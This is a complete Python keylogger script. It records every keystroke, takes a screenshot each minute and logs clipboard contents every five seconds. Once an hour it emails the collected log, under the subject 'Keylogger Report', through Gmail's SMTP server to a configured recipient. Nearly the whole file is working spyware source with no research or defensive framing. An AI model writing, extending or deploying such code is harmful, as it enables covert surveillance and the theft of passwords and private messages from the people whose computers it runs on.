import logging
from pynput import keyboard
import pyautogui
import pyperclip
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from datetime import datetime
import threading
import os
import time

# Email configuration
EMAIL_ADDRESS = "your_email@example.com"  # Change this to your email
EMAIL_PASSWORD = "your_password"          # Change this to your email password
SEND_TO_EMAIL = "recipient_email@example.com"  # Change to the recipient email

# Set up logging
log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

# Capture keystrokes
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener if ESC key is pressed
        return False

# Function to capture screenshots
def capture_screenshots():
    while True:
        screenshot_file = f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png"
        pyautogui.screenshot(screenshot_file)
        time.sleep(60)  # Take a screenshot every 60 seconds

# Function to log clipboard content
def log_clipboard():
    clipboard_content = ""
    while True:
        try:
            new_clipboard = pyperclip.paste()
            if new_clipboard != clipboard_content:
                clipboard_content = new_clipboard
                logging.info(f"Clipboard: {clipboard_content}")
        except Exception as e:
            logging.error(f"Clipboard Error: {e}")
        time.sleep(5)  # Check clipboard every 5 seconds

# Function to send email with logs
def send_email():
    while True:
        time.sleep(3600)  # Send logs every hour
        with open(log_file, 'r') as file:
            log_data = file.read()

        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = SEND_TO_EMAIL
        msg['Subject'] = 'Keylogger Report'

        msg.attach(MIMEText(log_data, 'plain'))

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, SEND_TO_EMAIL, msg.as_string())
            server.quit()
            logging.info("Email sent successfully.")
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

# Start the keylogger and other functions
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    # Run each task in a separate thread
    threading.Thread(target=start_keylogger).start()
    threading.Thread(target=capture_screenshots).start()
    threading.Thread(target=log_clipboard).start()
    threading.Thread(target=send_email).start()
